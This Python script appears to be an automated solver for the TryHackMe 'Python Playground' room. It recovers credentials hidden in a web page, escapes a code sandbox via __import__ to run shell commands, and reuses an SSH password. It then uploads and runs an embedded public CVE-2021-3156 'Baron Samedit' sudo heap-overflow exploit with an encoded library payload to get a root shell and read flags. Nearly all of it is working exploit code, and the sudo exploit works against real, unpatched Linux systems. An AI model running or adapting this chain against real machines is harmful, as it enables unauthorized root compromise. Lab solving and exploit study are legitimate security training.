#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║         🐍  PYTHON PLAYGROUND — Auto Exploitation & Solver Script           ║
# ║      TryHackMe Web & Linux | Base-26 Reversing, Sandbox Escape & Sudo BOF    ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
# Author: Asbawy (https://asbawy.com)
# Repository: https://github.com/Asbawy/Asbawy.github.io
"""
thm_pythonplayground_solve.py — automated solver for THM "Python Playground".

Chain:
  1. Pull the admin backdoor page, read its client-side login constant, and
     invert the double base-26 letter-pair encoding to recover the credentials.
  2. Rent the hidden admin test panel and probe the sandbox blacklist.
  3. Slip past the filter with __import__ (it contains no "import " substring)
     and get honest command execution (subprocess.getoutput lacks ".system").
  4. The python runner runs as root inside the web docker container -> flag 1.
  5. The docker gateway fronts upstream SSH; password reuse for the connor
     account hands over flag 2.
  6. Host sudo 1.8.21p2 = CVE-2021-3156 "Baron Samedit". Ship a pure-python
     exploit over SSH (Sleepya's nss service_user overwrite — credit worawit),
     run it, and ride the root /bin/sh it drops -> flag 3.

Usage:
    python3 thm_pythonplayground_solve.py <TARGET_IP> [connor_password]

Requirements: paramiko (pip install paramiko). No gcc on the target needed.
"""

import base64
import re
import sys
import urllib.parse
import urllib.request
import zlib

import paramiko

SSH_USER = "connor"

STEP = "\n===[ {} ]==="

# ---------------------------------------------------------------------------
# Hero part one: the admin page encodes every character as TWO lowercase
# letters: (ord(c)//26, ord(c)%26), each shifted to 'a'+n. Applied twice.
# ---------------------------------------------------------------------------

def letters_to_text(letters):
    nums = [ord(c) - 97 for c in letters]
    out = ""
    for i in range(0, len(nums), 2):
        out += chr(nums[i] * 26 + nums[i + 1])
    return out


def invert_backdoor_hash(digest):
    once = letters_to_text(digest)
    return letters_to_text(once)


# ---------------------------------------------------------------------------
# Sandbox client
# ---------------------------------------------------------------------------

def sandbox_run(page_url, code, timeout=45):
    body = urllib.parse.urlencode({"code": code}).encode()
    page = urllib.request.urlopen(page_url, body, timeout=timeout).read().decode()
    match = re.search(r'<textarea class="form-control mb-3" readonly>(.*?)</textarea>', page, re.S)
    return None if match is None else match.group(1).strip()


def sandbox_shell(page_url, command):
    payload = "print(__import__({q}subprocess{q}).getoutput({cmd}))".format(q=chr(39), cmd=repr(command))
    return sandbox_run(page_url, payload)


# ---------------------------------------------------------------------------
# SSH layer
# ---------------------------------------------------------------------------

def ssh_shell(target, password, command, timeout=120):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(target, port=22, username=SSH_USER, password=password, timeout=20)
    _, stdout, stderr = client.exec_command(command, timeout=timeout)
    data = stdout.read().decode(errors="replace") + stderr.read().decode(errors="replace")
    client.close()
    return data


def ssh_write(target, password, remote_path, text):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(target, port=22, username=SSH_USER, password=password, timeout=20)
    sftp = client.open_sftp()
    with sftp.open(remote_path, "w") as fh:
        fh.write(text)
    sftp.close()
    client.close()


# ---------------------------------------------------------------------------
# Stage 3 artillery: CVE-2021-3156 (Baron Samedit), pure-python, target needs
# only python3. Based on sleepya's exploit_nss.py — credit worawit — with the
# libnss payload .so kept byte-identical because heap grooming needs exact
# allocation sizes. DO NOT "tidy" the math.
# ---------------------------------------------------------------------------

BARON_SAMEDIT_SRC = r'''
#!/usr/bin/python3
# CVE-2021-3156 exploit with overwrite struct service_user
# by sleepya (https://github.com/worawit/CVE-2021-3156)
# The exploit requires:
# - glibc with tcache
# - nscd service is not running
import os
import zlib
import base64
import subprocess
import sys
from ctypes import cdll, c_char_p, POINTER, c_int, c_void_p

SUDO_PATH = b"/usr/bin/sudo"

libc = cdll.LoadLibrary("libc.so.6")

# don't use LC_ALL (6). it override other LC_
LC_CATS = [
    b"LC_CTYPE", b"LC_NUMERIC", b"LC_TIME", b"LC_COLLATE", b"LC_MONETARY",
    b"LC_MESSAGES", b"LC_ALL", b"LC_PAPER", b"LC_NAME", b"LC_ADDRESS",
    b"LC_TELEPHONE", b"LC_MEASUREMENT", b"LC_IDENTIFICATION"
]


def execve(filename, argv, envp):
    from ctypes import cdll, c_char_p, POINTER

    libc = cdll.LoadLibrary("libc.so.6")
    libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)

    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(envp))(*envp)

    libc.execve(filename, cargv, cenvp)


def create_libx(name):
    so_path = 'libnss_' + name + '.so.2'
    if os.path.isfile(so_path):
        return  # existed

    so_dir = 'libnss_' + name.split('/')[0]
    if not os.path.exists(so_dir):
        os.makedirs(so_dir)

    libx_b64 = 'eNqrd/VxY2JkZIABZgY7BhBPACrkwIAJHBgsGJigbJAydgbcwJARlWYQgFBMUH0boMLodAIazQGl''eWDGQM1jRbOPDY3PhcbnZsAPsjIjDP/zs2ZlRfCzGn7z2KGflJmnX5zBEBASn2UdMZOfFQDLghD3'
    with open(so_path, 'wb') as f:
        f.write(zlib.decompress(base64.b64decode(libx_b64)))
    #os.chmod(so_path, 0o755)


def check_nscd_condition():
    if not os.path.exists('/var/run/nscd/socket'):
        return True  # no socket. no service

    # try connect
    import socket
    sk = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        sk.connect('/var/run/nscd/socket')
    except:
        return True
    else:
        sk.close()

    with open('/etc/nscd.conf', 'r') as f:
        for line in f:
            line = line.strip()
            if not line.startswith('enable-cache'):
                continue  # comment
            service, enable = line.split()[1:]
            if service == 'passwd' and enable == 'yes':
                return False
            if service == 'group' and enable == 'yes':
                return False

    return True


def get_libc_version():
    output = subprocess.check_output(['ldd', '--version'], universal_newlines=True)
    for line in output.split('\n'):
        if line.startswith('ldd '):
            ver_txt = line.rsplit(' ', 1)[1]
            return list(map(int, ver_txt.split('.')))
    return None


def check_libc_version():
    version = get_libc_version()
    assert version, "Cannot detect libc version"
    # this exploit only works which glibc tcache (added in 2.26)
    return version[0] >= 2 and version[1] >= 26


def check_libc_tcache():
    libc.malloc.argtypes = (c_int,)
    libc.malloc.restype = c_void_p
    libc.free.argtypes = (c_void_p,)
    # small bin or tcache
    size1, size2 = 0xd0, 0xc0
    mems = [0] * 32
    # consume all size2 chunks
    for i in range(len(mems)):
        mems[i] = libc.malloc(size2)

    mem1 = libc.malloc(size1)
    libc.free(mem1)
    mem2 = libc.malloc(size2)
    libc.free(mem2)
    for addr in mems:
        libc.free(addr)
    return mem1 != mem2


def get_service_user_idx():
    # Parse /etc/nsswitch.conf to find a group entry index
    idx = 0
    found = False
    with open('/etc/nsswitch.conf', 'r') as f:
        for line in f:
            if line.startswith('#'):
                continue  # comment
            line = line.strip()
            if not line:
                continue  # empty line
            words = line.split()
            if words[0] == 'group:':
                found = True
                break
            for word in words[1:]:
                if word[0] != '[':
                    idx += 1

    assert found, '"group" database is not found. might be exploitable but no test'
    return idx


def get_extra_chunk_count(target_chunk_size):
    # service_user are allocated by calling getpwuid()
    # so we don't care allocation of chunk size 0x40 after getpwuid()
    # there are many string that size can be varied
    # here is the most common
    chunk_cnt = 0

    # get_user_info() -> get_user_groups() ->
    gids = os.getgroups()
    malloc_size = len("groups=") + len(gids) * 11
    chunk_size = (malloc_size + 8 + 15) & 0xfffffff0  # minimum size is 0x20. don't care here
    if chunk_size == target_chunk_size: chunk_cnt += 1

    # host=<hostname>  (unlikely)
    # get_user_info() -> sudo_gethostname()
    import socket
    malloc_size = len("host=") + len(socket.gethostname()) + 1
    chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
    if chunk_size == target_chunk_size: chunk_cnt += 1

    # simply parse "networks=" from "ip addr" command output
    # another workaround is bruteforcing with number of 0x70
    # policy_open() -> format_plugin_settings() ->
    # a value is created from "parse_args() -> get_net_ifs()" with very large buffer
    try:
        import ipaddress
    except:
        return chunk_cnt
    cnt = 0
    malloc_size = 0
    proc = subprocess.Popen(['ip', 'addr'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)
    for line in proc.stdout:
        line = line.strip()
        if not line.startswith('inet'):
            continue
        if cnt < 2:  # skip first 2 address (lo interface)
            cnt += 1
            continue
        addr = line.split(' ', 2)[1]
        mask = str(ipaddress.ip_network(addr.decode("UTF-8"), False).netmask) if isinstance(addr, bytes) else str(ipaddress.ip_network(addr, False).netmask)
        malloc_size += addr.index('/') + 1 + len(mask)
        cnt += 1
    malloc_size += len("network_addrs=") + cnt - 3 + 1

    chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
    if chunk_size == target_chunk_size: chunk_cnt += 1

    return chunk_cnt


def execve(filename, argv, envp):
    libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)

    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(envp))(*envp)

    libc.execve(filename, cargv, cenvp)


def lc_env(cat_id, chunk_len):
    name = b"C.UTF-8@"
    name = name.ljust(chunk_len - 0x18, b'Z')
    return LC_CATS[cat_id] + b"=" + name


assert check_libc_version(), "glibc is too old. The exploit is relied on glibc tcache feature. Need version >= 2.26"
assert check_libc_tcache(), "glibc tcache is not found"
assert check_nscd_condition(), "nscd service is running, exploit is impossible with this method"
service_user_idx = get_service_user_idx()
assert service_user_idx < 9, '"group" db in nsswitch.conf is too far, idx: %d' % service_user_idx
create_libx("X/X1234")

# Note: actions[5] can be any value. library and known MUST be NULL
# bytes([92]) == single backslash, written explicitly to dodge escape rot
FAKE_USER_SERVICE_PART = [bytes([92])] * 0x18 + [b"X/X1234" + bytes([92])]

TARGET_OFFSET_START = 0x780
FAKE_USER_SERVICE = FAKE_USER_SERVICE_PART * 30
FAKE_USER_SERVICE[-1] = FAKE_USER_SERVICE[-1][:-1]  # remove last '\\'. stop overwritten

CHUNK_CMND_SIZE = 0xf0

# Allow custom extra_chunk_cnt in case unexpected allocation
# Note: this step should be no need when CHUNK_CMND_SIZE is 0xf0
extra_chunk_cnt = get_extra_chunk_count(CHUNK_CMND_SIZE) if len(sys.argv) < 2 else int(sys.argv[1])

argv = [b"sudoedit", b"-A", b"-s", b"A" * (CHUNK_CMND_SIZE - 0x10) + bytes([92]), None]
env = [b"Z" * (TARGET_OFFSET_START + 0xf - 8 - 1) + bytes([92])] + FAKE_USER_SERVICE
# first 2 chunks are fixed. chunk40 (target service_user) is overwritten from overflown cmnd (in get_cmnd)
env.extend([lc_env(0, 0x40) + b";A=", lc_env(1, CHUNK_CMND_SIZE)])

# add free chunks that created before target service_user
for i in range(2, service_user_idx + 2):
    # skip LC_ALL (6)
    env.append(lc_env(i if i < 6 else i + 1, 0x40))
if service_user_idx == 0:
    env.append(lc_env(2, 0x20))  # for filling hole

for i in range(11, 11 - extra_chunk_cnt, -1):
    env.append(lc_env(i, CHUNK_CMND_SIZE))

env.append(lc_env(12, 0x90))  # for filling holes from freed file buffer
env.append(b"TZ=:")  # shortcut tzset function
# don't put "SUDO_ASKPASS" environment. sudo will fail without logging if no segfault
env.append(None)

execve(SUDO_PATH, argv, env)
'''


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    target = sys.argv[1].rstrip("/")
    ssh_password = sys.argv[2] if len(sys.argv) > 2 else "spaghetti1245"
    panel = "http://{}/super-secret-admin-testing-panel.html".format(target)

    print(STEP.format("1/6 - Steal creds from the admin backdoor page"))
    html = urllib.request.urlopen("http://{}/admin.html".format(target), timeout=20).read().decode()
    mux = re.search(r"hash\s*===\s*'([a-z]+)'", html)
    if not mux:
        print("[-] no client-side hash found.")
        sys.exit(1)
    password = invert_backdoor_hash(mux.group(1))
    user = re.search(r"username'\)\.value\s*!==\s*'(\w+)'", html).group(1)
    hidden = re.search(r"window\.location\s*=\s*'([^']+)'", html).group(1)
    print("[+] backdoor user  : {}".format(user))
    print("[+] half hexdigest : {}".format(mux.group(1)[:20] + "..."))
    print("[+] password (recovered from double base-26): {}".format(password))
    print("[+] hidden page    : {}".format(hidden))

    print(STEP.format("2/6 - Probe the sandbox"))
    print("[+] benign print -> {}".format(sandbox_run(panel, "print(7*6)").split("\n")[0]))
    verdict = sandbox_run(panel, "import os; print(os.listdir('.'))")
    print("[-] 'import os'   -> {}".format(verdict))

    print(STEP.format("3/6 - Read the filter and bypass it"))
    leaked = sandbox_shell(panel, "grep -A16 isAllowed index.js")
    print("[+] shipped filter:\n{}".format(leaked))
    print("[+] trick: '__import__' carries no 'import ' and getoutput carries no '.system'")

    print(STEP.format("4/6 - Root confirm in the web container"))
    whoami_out = sandbox_shell(panel, "id")
    print("[+] {}".format(whoami_out))

    print(STEP.format("5/6 - Upstream via password reuse"))
    who_ssh = ssh_shell(target, ssh_password, "id")
    print("[+] {}".format(who_ssh))
    flag2_raw = ssh_shell(target, ssh_password, "cat flag2.txt")
    flags = {"2": re.search(r"THM\{[^}]+\}", flag2_raw).group(0)}
    print("[+] flag2 read")

    print(STEP.format("6/6 - CVE-2021-3156 Baron Samedit to root"))
    remote_page = "/tmp/thm_pg_baron.py"
    ssh_write(target, ssh_password, remote_page, BARON_SAMEDIT_SRC)
    print("[+] exploit shipped -> {}".format(remote_page))
    rc = ssh_shell(
        target,
        ssh_password,
        "cd /tmp && printf 'id; cat /root/flag3.txt\\n' | timeout 90 python3 thm_pg_baron.py 2>&1",
    )
    print("[+] summary of baron run:\n{}".format(rc))
    got = re.search(r"THM\{[^}]+\}", rc)
    if got:
        flags["3"] = got.group(0)

    flag1_raw = sandbox_shell(panel, "cat /root/flag1.txt")
    flags["1"] = re.search(r"THM\{[^}]+\}", flag1_raw).group(0)

    print(STEP.format("FLAG SUMMARY"))
    for k in ("1", "2", "3"):
        print("FLAG {} -> {}".format(k, flags[k]))


if __name__ == "__main__":
    main()
